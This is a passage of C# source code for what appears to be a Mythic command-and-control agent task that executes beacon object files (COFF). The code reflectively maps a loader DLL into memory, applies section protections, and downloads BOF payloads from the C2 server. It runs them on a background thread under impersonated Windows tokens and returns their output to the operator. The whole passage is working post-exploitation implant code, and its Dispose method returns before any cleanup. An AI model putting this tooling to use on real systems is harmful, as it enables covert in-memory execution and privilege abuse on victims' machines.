                            case IMAGE_REL_BASED_LOW:
                                // Low 16-bits of a 32-bit relocation
                                ushort low = (ushort)Marshal.ReadInt16(ptrAddress);
                                Marshal.WriteInt16(ptrAddress, (short)(low + (short)(delta & 0xFFFF)));
                                break;

                            default:
                                throw new NotSupportedException($"Unsupported relocation type: {type}");
                        }
                    }

                    // Move to the next relocation block
                    ptrReloc = IntPtr.Add(ptrReloc, (int)relocation.SizeOfBlock);
                    remainingSize -= relocation.SizeOfBlock;
                }
            }

            private void ProtectMemory()
            {
                // Get pointers to PE headers
                IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(_baseAddress, typeof(IMAGE_DOS_HEADER));
                IntPtr ptrNtHeader = IntPtr.Add(_baseAddress, dosHeader.e_lfanew);

                // Get the section headers
                IntPtr ptrSectionHeader;
                int numberOfSections;

                if (_is64Bit)
                {
                    IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS64));
                    numberOfSections = ntHeaders.FileHeader.NumberOfSections;
                    ptrSectionHeader = IntPtr.Add(ptrNtHeader, Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
                }
                else
                {
                    IMAGE_NT_HEADERS32 ntHeaders = (IMAGE_NT_HEADERS32)Marshal.PtrToStructure(ptrNtHeader, typeof(IMAGE_NT_HEADERS32));
                    numberOfSections = ntHeaders.FileHeader.NumberOfSections;
                    ptrSectionHeader = IntPtr.Add(ptrNtHeader, Marshal.SizeOf(typeof(IMAGE_NT_HEADERS32)));
                }

                // Process each section
                for (int i = 0; i < numberOfSections; i++)
                {
                    IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(ptrSectionHeader, typeof(IMAGE_SECTION_HEADER));

                    if (sectionHeader.VirtualAddress != 0 && sectionHeader.SizeOfRawData > 0)
                    {
                        // Determine the appropriate protection flags
                        uint protect = PAGE_READWRITE; // Default

                        if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
                        {
                            if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE) != 0)
                                protect = PAGE_EXECUTE_READWRITE;
                            else if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_READ) != 0)
                                protect = PAGE_EXECUTE_READ;
                            else
                                protect = PAGE_EXECUTE;
                        }
                        else if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_WRITE) != 0)
                        {
                            protect = PAGE_READWRITE;
                        }
                        else if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_READ) != 0)
                        {
                            protect = PAGE_READONLY;
                        }

                        // Calculate the section's memory size (aligned to page size)
                        IntPtr sectionAddress = IntPtr.Add(_baseAddress, (int)sectionHeader.VirtualAddress);
                        uint oldProtect;

                        // Apply the protection
                        if (!VirtualProtect(sectionAddress, (UIntPtr)sectionHeader.SizeOfRawData, protect, out oldProtect))
                            throw new InvalidOperationException($"Failed to set memory protection for section {i}");
                    }

                    ptrSectionHeader = IntPtr.Add(ptrSectionHeader, Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
                }
            }

            #endregion

            #region IDisposable Implementation

            /// <summary>
            /// Disposes the memory module and frees all resources.
            /// </summary>
            public void Dispose()
            {
                Dispose(true);
                GC.SuppressFinalize(this);
            }

            protected virtual void Dispose(bool disposing)
            {
                return;
                if (!_disposed)
                {
                    if (_baseAddress != IntPtr.Zero)
                    {
                        // Call DllMain with DLL_PROCESS_DETACH if we have an entry point
                        if (_entryPoint != IntPtr.Zero)
                        {
                            try
                            {
                                DllEntryDelegate dllEntry = (DllEntryDelegate)Marshal.GetDelegateForFunctionPointer(_entryPoint, typeof(DllEntryDelegate));
                                dllEntry(_baseAddress, DLL_PROCESS_DETACH, IntPtr.Zero);
                            }
                            catch
                            {
                                // Ignore errors during cleanup
                            }
                        }

                        // Free memory
                        VirtualFree(_baseAddress, UIntPtr.Zero, MEM_RELEASE);
                        _baseAddress = IntPtr.Zero;
                    }

                    // Free loaded modules
                    foreach (IntPtr hModule in _modules.Values)
                    {
                        try
                        {
                            FreeLibrary(hModule);
                        }
                        catch
                        {
                            // Ignore errors during cleanup
                        }
                    }

                    _modules.Clear();
                    _disposed = true;
                }
            }

            #endregion
        }
        public static bool LoadDLL(byte[] dllBytes)
        {
            if(_RunCOFF == null || _Unhexlify == null || _BeaconGetOutputData == null)
            {
                try
                {
                    MemoryModule loadedDLL = new MemoryModule(dllBytes);
                    _RunCOFF = loadedDLL.GetDelegate<RunCOFFDelegate>("RunCOFF");
                    _Unhexlify = loadedDLL.GetDelegate<UnhexlifyDelegate>("Unhexlify");
                    _BeaconGetOutputData = loadedDLL.GetDelegate<BeaconGetOutputDataDelegate>("BeaconGetOutputData");
                }catch(Exception ex)
                {
                    DebugHelp.DebugWriteLine($"Exception: {ex.Message}");
                    DebugHelp.DebugWriteLine($"Exception Location: {ex.StackTrace}");
                    return false;
                }

            }
            return true;
        }
        // Class to hold the state for COFF execution thread
        private class COFFExecutionState
        {
            public IAgent Agent { get; set; }
            public string FunctionName { get; set; }
            public IntPtr CoffData { get; set; }
            public uint FileSize { get; set; }
            public IntPtr ArgumentData { get; set; }
            public int ArgumentSize { get; set; }
            public int Status { get; set; }
            public AutoResetEvent CompletionEvent { get; set; }
            public string Output { get; set; }
            public Exception Error { get; set; }
        }

        // Method to run COFF in a separate thread
        private static void ExecuteCOFFThreadFunc(object state)
        {
            COFFExecutionState executionState = (COFFExecutionState)state;
            IAgent agent = executionState.Agent;
            try
            {
                DebugHelp.DebugWriteLine($"Starting COFF execution in thread {Thread.CurrentThread.ManagedThreadId}");
                WindowsImpersonationContext tokenApplied;
                if (!agent.GetIdentityManager().IsOriginalIdentity())
                {
                    DebugHelp.DebugWriteLine("Applying impersonation token to COFF execution thread");
                    try
                    {
                        // Impersonate the current identity in this new thread
                        tokenApplied = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Impersonate();
                        DebugHelp.DebugWriteLine($"Successfully applied token for {agent.GetIdentityManager().GetCurrentImpersonationIdentity().Name} to COFF thread");
                        // Debug information about the current token
                        WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
                        DebugHelp.DebugWriteLine($"Thread identity after impersonation attempt: {currentThreadIdentity.Name}");
                        //DebugHelp.DebugWriteLine($"Thread token type: {currentThreadIdentity.Token.ToInt64():X}");
                        //DebugHelp.DebugWriteLine($"Is authenticated: {currentThreadIdentity.IsAuthenticated}");
                        //DebugHelp.DebugWriteLine($"Authentication type: {currentThreadIdentity.AuthenticationType}");

                        // List of groups/claims
                        //DebugHelp.DebugWriteLine("Token groups/claims:");
                        //foreach (var claim in currentThreadIdentity.Claims)
                        //{
                        //    DebugHelp.DebugWriteLine($"  - {claim.Type}: {claim.Value}");
                        //}

                        // Compare with expected identity
                        string expectedName = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Name;
                        DebugHelp.DebugWriteLine($"Expected identity: {expectedName}");
                        DebugHelp.DebugWriteLine($"Identity match: {expectedName == currentThreadIdentity.Name}");

                    }
                    catch (Exception ex)
                    {
                        DebugHelp.DebugWriteLine($"Error applying token to thread: {ex.Message}");
                        // Fallback to using SetThreadToken API directly
                        IntPtr threadHandle = GetCurrentThread();
                        IntPtr tokenHandle = agent.GetIdentityManager().GetCurrentImpersonationIdentity().Token;

                        bool result = SetThreadToken(ref threadHandle, tokenHandle);
                        if (result)
                        {
                            DebugHelp.DebugWriteLine("Successfully applied token using SetThreadToken API");
                            // Verify identity after SetThreadToken
                            WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
                            DebugHelp.DebugWriteLine($"Thread identity after SetThreadToken: {currentThreadIdentity.Name}");
                        }
                        else
                        {
                            int error = Marshal.GetLastWin32Error();
                            DebugHelp.DebugWriteLine($"SetThreadToken failed with error: {error}");
                        }
                    }
                }
                else
                {
                    DebugHelp.DebugWriteLine("Using original identity for COFF execution");
                    try
                    {
                        WindowsIdentity currentThreadIdentity = WindowsIdentity.GetCurrent();
                        DebugHelp.DebugWriteLine($"Thread identity (original): {currentThreadIdentity.Name}");
                    }
                    catch (Exception ex)
                    {
                        DebugHelp.DebugWriteLine($"Error getting current identity: {ex.Message}");
                    }
                }
                // Execute the COFF
                executionState.Status = _RunCOFF(
                    executionState.FunctionName,
                    executionState.CoffData,
                    executionState.FileSize,
                    executionState.ArgumentData,
                    executionState.ArgumentSize);

                DebugHelp.DebugWriteLine($"COFF execution completed with status: {executionState.Status}");

                // Get output data if execution was successful
                if (executionState.Status == 0)
                {
                    int outdataSize = 0;
                    IntPtr outdata = _BeaconGetOutputData(ref outdataSize);

                    if (outdata != IntPtr.Zero && outdataSize > 0)
                    {
                        byte[] outDataBytes = new byte[outdataSize];
                        Marshal.Copy(outdata, outDataBytes, 0, outdataSize);
                        executionState.Output = Encoding.Default.GetString(outDataBytes);
                        DebugHelp.DebugWriteLine($"Retrieved {outdataSize} bytes of output data");
                    }
                    else
                    {
                        executionState.Output = "No Output";
                        DebugHelp.DebugWriteLine("No output data was returned from COFF execution");
                    }
                }
                else
                {
                    DebugHelp.DebugWriteLine($"COFF execution failed with status: {executionState.Status}");
                }
                try
                {
                    DebugHelp.DebugWriteLine("Reverting impersonation in COFF thread");
                    WindowsIdentity.Impersonate(IntPtr.Zero);
                }
                catch (Exception ex)
                {
                    DebugHelp.DebugWriteLine($"Error reverting impersonation: {ex.Message}");
                }

            }
            catch (Exception ex)
            {
                DebugHelp.DebugWriteLine($"Exception in COFF execution thread: {ex.Message}");
                DebugHelp.DebugWriteLine($"Exception stack trace: {ex.StackTrace}");
                executionState.Error = ex;
            }
            finally
            {
                // Signal that execution is complete
                DebugHelp.DebugWriteLine("Signaling COFF execution completion");
                executionState.CompletionEvent.Set();
            }
        }
        public override void Start()
        {
            MythicTaskResponse resp;

            try
            {
                CoffParameters parameters = _jsonSerializer.Deserialize<CoffParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.CoffName) ||  string.IsNullOrEmpty(parameters.FunctionName))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                    return;
                }
                _agent.GetFileManager().GetFileFromStore(parameters.CoffLoaderId, out byte[] coffLoaderDllBytes);
                if (coffLoaderDllBytes is null || coffLoaderDllBytes.Length == 0)
                {
                    if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.CoffLoaderId, out coffLoaderDllBytes))
                    {
                        _agent.GetFileManager().AddFileToStore(parameters.CoffLoaderId, coffLoaderDllBytes);
                    }
                    else
                    {
                        resp = CreateTaskResponse($"Failed to get coff loader from Mythic", true, "error");
                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                    }
                }
                if (!LoadDLL(coffLoaderDllBytes))
                {
                    resp = CreateTaskResponse(
                       $"Failed to load COFFLoader.dll reflectively.",
                       true,
                       "error");
                    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                    return;
                }
                _agent.GetFileManager().GetFileFromStore(parameters.CoffName, out byte[] coffBytes);
                if (coffBytes is null || coffBytes.Length == 0)
                {
                    if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.BofId, out coffBytes))
                    {
                        _agent.GetFileManager().AddFileToStore(parameters.BofId, coffBytes);
                    }
                    else
                    {
                        resp = CreateTaskResponse($"Failed to get bof from Mythic", true, "error");
                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                        return;
                    }
                }

                int coffArgsSize = 0;
                int outdataSize = 0;
                IntPtr coffArgs = _Unhexlify(parameters.PackedArguments, ref coffArgsSize);
                IntPtr RunCOFFinputBuffer = Marshal.AllocHGlobal(coffBytes.Length * sizeof(byte));
                Marshal.Copy(coffBytes, 0, RunCOFFinputBuffer, coffBytes.Length);
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("[*] Starting COFF Execution...\n\n",false, $"Executing COFF {parameters.CoffName}"));
                // Create execution state object
                COFFExecutionState executionState = new COFFExecutionState
                {
                    Agent = _agent,
                    FunctionName = parameters.FunctionName,
                    CoffData = RunCOFFinputBuffer,
                    FileSize = (uint)coffBytes.Length,
                    ArgumentData = coffArgs,
                    ArgumentSize = coffArgsSize,
                    CompletionEvent = new AutoResetEvent(false),
                    Output = "No Output"
                };
                try
                {
                    // Start execution in a separate thread
                    DebugHelp.DebugWriteLine("Starting COFF execution thread");
                    Thread executionThread = new Thread(new ParameterizedThreadStart(ExecuteCOFFThreadFunc));
                    executionThread.IsBackground = true; // Make thread a background thread so it doesn't keep process alive
                    executionThread.Start(executionState);

                    // Wait for the thread to complete or timeout
                    DebugHelp.DebugWriteLine($"Waiting for COFF execution to complete (timeout: {parameters.timeout * 1000} ms)");
                    int timeout = parameters.timeout * 1000 > 0 ? parameters.timeout * 1000 : -1;
                    bool completed = executionState.CompletionEvent.WaitOne(timeout);

                    if (!completed)
                    {
                        // Execution timed out
                        executionThread.Abort();
                        DebugHelp.DebugWriteLine("COFF execution timed out");
                        resp = CreateTaskResponse(
                            $"COFF execution timed out after {parameters.timeout} seconds",
                            true,
                            "error");
                    }
                    else if (executionState.Error != null)
                    {
                        // Execution threw an exception
                        Exception ex = executionState.Error;
                        DebugHelp.DebugWriteLine($"COFF execution threw exception: {ex.Message}");
                        resp = CreateTaskResponse(
                            $"Exception during COFF execution: {ex.Message} \nLocation: {ex.StackTrace}",
                            true,
                            "error");
                    }
                    else if (executionState.Status != 0)
                    {
                        // Execution completed with an error status
                        DebugHelp.DebugWriteLine($"COFF execution failed with status: {executionState.Status}");
                        resp = CreateTaskResponse(
                            $"RunCOFF failed with status: {executionState.Status}",
                            true,
                            "error");
                    }
                    else
                    {
                        // Execution completed successfully
                        DebugHelp.DebugWriteLine("COFF execution completed successfully");
                        resp = CreateTaskResponse(executionState.Output, true);
                    }
                }
                finally
                {
                    // Clean up resources
                    DebugHelp.DebugWriteLine("Cleaning up COFF execution resources");
                    Marshal.FreeHGlobal(RunCOFFinputBuffer);
                    // No need to free coffArgs as it's managed by the COFF loader
                }
            }


            catch (Exception ex)
            {
                DebugHelp.DebugWriteLine($"Exception: {ex.Message}");
                DebugHelp.DebugWriteLine($"Exception Location: {ex.StackTrace}");
                resp = CreateTaskResponse($"Exception: {ex.Message} \n Location: {ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("\n[*] COFF Finished.", true));
        }
    }
}
#endif